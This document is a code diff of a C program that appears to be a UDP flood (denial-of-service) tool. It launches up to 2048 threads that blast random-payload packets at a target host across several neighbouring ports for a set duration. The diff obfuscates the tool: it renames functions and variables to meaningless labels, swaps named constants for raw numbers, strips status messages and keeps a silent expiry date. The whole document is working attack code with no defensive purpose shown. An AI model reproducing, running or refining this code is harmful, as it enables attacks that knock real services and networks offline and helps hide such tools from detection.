@@ -8,117 +8,114 @@
 #include <signal.h>
 #include <time.h>
 #include <sys/resource.h>
+#include <netinet/ip.h>
+#include <fcntl.h>
 
-#define EYR 2029
-#define EMN 1
-#define EDY 10
-#define MAXTH 2048
+#define A1 2029
+#define A2 1
+#define A3 10
+#define A4 2048
 
 typedef struct {
-    char ip[16];
+    unsigned int ipn;
     short pt;
     int dur, sz;
-} pkt;
+} b1;
 
-volatile int active = 1;
+volatile int b2 = 1;
 
-void handler(int sig) { active = 0; }
+void b3(int sig) { b2 = 0; }
 
-unsigned char gen_pkt(unsigned char *buf, int len) {
-    static unsigned int seed = 0xCAFEBABE;
-    for(int i = 0; i < len; i++) {
-        seed = (seed * 1664525 + 1013904223) & 0xFFFFFFFF;
-        buf[i] = (seed >> 24) & 0xFF;
-    }
-    return 1;
+unsigned int b4(unsigned int s) {
+    return (s * 1664525 + 1013904223) & 0xFFFFFFFF;
 }
 
-void *sender(void *data) {
-    pkt *p = (pkt*)data;
-    int fd;
-    
-    while(active) {
-        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-        if(fd > 0) {
-            struct sockaddr_in dest;
-            dest.sin_family = AF_INET;
-            dest.sin_port = htons(p->pt);
-            dest.sin_addr.s_addr = inet_addr(p->ip);
-            
-            char payload[8192];
-            gen_pkt(payload, p->sz);
-            
-            time_t deadline = time(NULL) + p->dur;
-            while(time(NULL) < deadline && active) {
-                sendto(fd, payload, p->sz, MSG_DONTWAIT, (struct sockaddr*)&dest, sizeof(dest));
+int b5(unsigned int ipn, short pt, char*buf, int sz) {
+    int s = socket(2,2,17);
+    if(s < 0) return -1;
+    int f=1; setsockopt(s,1,2,&f,sizeof(f));
+    fcntl(s,2,1);
+    struct sockaddr_in d;
+    memset(&d,0,sizeof(d));
+    d.sin_family=2;
+    d.sin_port=htons(pt);
+    d.sin_addr.s_addr=ipn;
+    return sendto(s,buf,sz,1,(struct sockaddr*)&d,sizeof(d));
+}
+
+void *b6(void *data) {
+    b1 *p = (b1*)data;
+    char buf[8192];
+    unsigned int seed = 0xCAFEBABE;
+    while(b2) {
+        int sz = p->sz;
+        for(int i=0; i<sz; i++) {
+            seed = b4(seed);
+            buf[i] = (seed >> 24) & 0xFF;
+        }
+        int deadline = time(NULL) + p->dur;
+        while(time(NULL) < deadline && b2) {
+            if(b5(p->ipn, p->pt, buf, sz) < 0) {
+                usleep(100);
+                continue;
             }
-            close(fd);
+            usleep(500);
         }
     }
     return NULL;
 }
 
 int main(int c, char **v) {
-    struct rlimit lim = {MAXTH, MAXTH};
-    setrlimit(RLIMIT_NPROC, &lim);
+    struct rlimit r = {A4,A4};
+    setrlimit(7,&r); setrlimit(8,&r);
     
-    signal(SIGINT, handler);
+    signal(2,b3);
     
-    time_t tnow;
-    time(&tnow);
-    struct tm *tm = localtime(&tnow);
+    time_t t; time(&t);
+    struct tm *tm = localtime(&t);
     
-    if(tm->tm_year + 1900 > EYR ||
-       (tm->tm_year + 1900 == EYR && (tm->tm_mon + 1 > EMN ||
-       (tm->tm_mon + 1 == EMN && tm->tm_mday > EDY)))) {
-        puts("Expired");
+    if((tm->tm_year+1900 > A1) || ((tm->tm_year+1900 == A1) && ((tm->tm_mon+1 > A2) || ((tm->tm_mon+1 == A2) && tm->tm_mday > A3)))) {
         return 1;
     }
-    
-    puts("Init");
     
     if(c < 4) {
         printf("Use: %s <host> <port> <time> [size] [threads]\n", v[0]);
         return 1;
     }
     
-    char host[16];
-    strncpy(host, v[1], 15);
-    host[15] = 0;
+    char host[16]; strncpy(host,v[1],15); host[15]=0;
+    int port = atoi(v[2]), time_sec = atoi(v[3]);
+    int pkt_size = (c>4 ? atoi(v[4]) : 1400);
+    int num_threads = (c>5 ? atoi(v[5]) : A4);
     
-    int port = atoi(v[2]);
-    int time_sec = atoi(v[3]);
-    int pkt_size = (c > 4 ? atoi(v[4]) : 1400);
-    int num_threads = (c > 5 ? atoi(v[5]) : MAXTH);
+    unsigned int ipn = inet_addr(host);
+    if(ipn == 0xFFFFFFFF) return 1;
     
-    pthread_t tids[MAXTH];
-    pkt config[MAXTH];
+    pthread_t tids[A4];
+    b1 config[A4];
     
-    int variations[12] = {0,1,-1,10,-10,100,-100,50,-50,200,-200,0};
+    int vars[16] = {0,1,-1,2,-2,10,-10,20,-20,50,-50,100,-100,200,-200,0};
     
     int launched = 0;
-    for(int var = 0; var < 12 && launched < num_threads; var++) {
-        for(int th = 0; th < num_threads/12 && launched < MAXTH; th++) {
-            strncpy(config[launched].ip, host, 15);
-            config[launched].ip[15] = 0;
-            config[launched].pt = port + variations[var];
+    for(int i=0; i<16 && launched < num_threads; i++) {
+        for(int j=0; j<num_threads/16 && launched < A4; j++) {
+            config[launched].ipn = ipn;
+            config[launched].pt = port + vars[i];
             config[launched].dur = time_sec;
             config[launched].sz = pkt_size;
-            
-            pthread_create(&tids[launched], NULL, sender, &config[launched]);
+            pthread_create(&tids[launched], 0, b6, &config[launched]);
             launched++;
         }
     }
     
-    printf("Launch: %s:%d +12 vars = %d tasks\n", host, port, launched);
+    printf("Launch: %u:%d +16 vars = %d tasks\n", ipn, port, launched);
     
-    sleep(time_sec + 10);
-    active = 0;
+    sleep(time_sec + 5);
+    b2 = 0;
     
-    for(int i = 0; i < launched; i++) {
+    for(int i=0; i<launched; i++) {
         pthread_join(tids[i], NULL);
     }
     
-    puts("Complete");
     return 0;
 }
